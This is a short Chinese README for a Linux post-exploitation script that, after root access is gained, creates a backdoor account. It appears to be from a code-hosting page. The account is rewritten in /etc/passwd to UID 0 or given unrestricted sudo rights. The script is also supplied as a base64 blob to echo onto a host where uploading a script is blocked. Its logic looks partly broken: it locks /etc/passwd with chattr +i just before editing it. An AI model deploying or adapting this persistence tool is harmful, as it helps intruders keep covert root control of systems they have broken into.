# linux-adduser
在获得root权限后快速添加root权限用户
# 使用 
```
chmod +x adduser.sh
sh adduser.sh username passwd
```
# base64版本
在无法上传sh脚本时使用echo写入
```
echo IyEvYmluL2Jhc2gKaWYgW1sgJEVVSUQgLW5lIDAgXV07IHRoZW4KICAgZWNobyAi6K+35Lulcm9vdOeUqOaIt+i6q+S7vei/kOihjOivpeiEmuacrOOAgiIKICAgZXhpdCAxCmZpCmlmIFtbICQjIC1uZSAyIF1dOyB0aGVuCiAgIGVjaG8gIuivt+aPkOS+m+eUqOaIt+WQjeWSjOWvhueggeS9nOS4uuiEmuacrOWPguaVsOOAgiIKICAgZWNobyAi56S65L6LOiAkMCA855So5oi35ZCNPiA85a+G56CBPiIKICAgZXhpdCAxCmZpCnVzZXJuYW1lPSQxCnBhc3N3b3JkPSQyCnVzZXJhZGQgLW0gJHVzZXJuYW1lCmlmIFtbICQ/IC1uZSAwIF1dOyB0aGVuCiAgIGVjaG8gIuaXoOazleWIm+W7uueUqOaItyAkdXNlcm5hbWXvvIzor7fmo4Dmn6Xlj4LmlbDmiJblhbbku5bpmZDliLbjgIIiCiAgIGV4aXQgMQpmaQplY2hvICIkdXNlcm5hbWU6JHBhc3N3b3JkIiB8IGNocGFzc3dkCnVzZXJtb2QgLWcgcm9vdCAkdXNlcm5hbWUKZWNobyAi566h55CG5ZGY55So5oi3ICR1c2VybmFtZSDliJvlu7rmiJDlip/jgIIiCmNoYXR0ciAraSAvZXRjL3Bhc3N3ZApzZWQgLWkgInN8XiR1c2VybmFtZTp4Oi4qOnwkdXNlcm5hbWU6eDowOjA6cm9vdDovcm9vdDp8ZyIgL2V0Yy9wYXNzd2QKaWYgW1sgJD8gLW5lIDAgXV07IHRoZW4KICAgZWNobyAi5peg5rOV55u05o6l5L+u5pS5L2V0Yy9wYXNzd2TkuK3nlKjmiLcgJHVzZXJuYW1lIOeahFVJROOAgiIKICAgZWNobyAi5bCd6K+V5re75Yqgc3VkbyIKICAgZWNobyAiJHVzZXJuYW1lIEFMTD0oQUxMKSBBTEwiPj4vZXRjL3N1ZG9lcnMKCWlmIFtbICQ/IC1uZSAwIF1dOyB0aGVuCgkJZWNobyAi5peg5rOV5bCG55So5oi3ICR1c2VybmFtZSDmt7vliqDliLBzdWRvZXJz5paH5Lu277yM6K+35qOA5p+l5Y+C5pWw5oiW5YW25LuW6ZmQ5Yi244CCIgoJZWxzZQoJCWVjaG8gIuWwhueUqOaItyAkdXNlcm5hbWUg5re75Yqg5Yiwc3Vkb2Vyc+aWh+S7tu+8jHN1ZG8gc3Xml6Llj6/ojrflvpdyb2905p2D6ZmQ44CCIgoJZmkKCQoJCiAgIGV4aXQgMQogICAKZWxzZQoJZWNobyAi55So5oi3ICR1c2VybmFtZeeahFVJROW3suaIkOWKn+S/ruaUueS4ujDjgIIiCglncm91cGRlbCAkdXNlcm5hbWUKCXJtIC1yZiAvaG9tZS8kdXNlcm5hbWUKZmk= > adduser.txt
base64 -d adduser.txt > adduser.sh
chmod +x adduser.sh
sh adduser.sh username passwd
```
